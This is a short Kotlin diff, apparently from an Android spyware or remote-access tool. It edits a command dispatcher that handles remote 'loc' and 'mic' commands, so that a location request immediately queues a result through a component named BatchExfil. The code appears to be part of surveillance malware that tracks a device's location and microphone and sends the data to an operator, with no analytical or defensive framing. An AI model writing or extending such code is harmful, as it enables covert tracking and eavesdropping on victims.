@@ -21,7 +21,10 @@ object Commands {
 
     fun dispatch(ctx: Context, cmd: String, args: Map<String, String>) {
         when (cmd) {
-            "loc" -> start(ctx, LocationService::class.java)
+            "loc" -> {
+                LocationService.requestNow(ctx)
+                BatchExfil.enqueue(ctx, "cmd_result", """{"cmd":"loc","ok":true}""")
+            }
 
             "mic" -> {
                 val sec = args["sec"]?.toIntOrNull() ?: 60
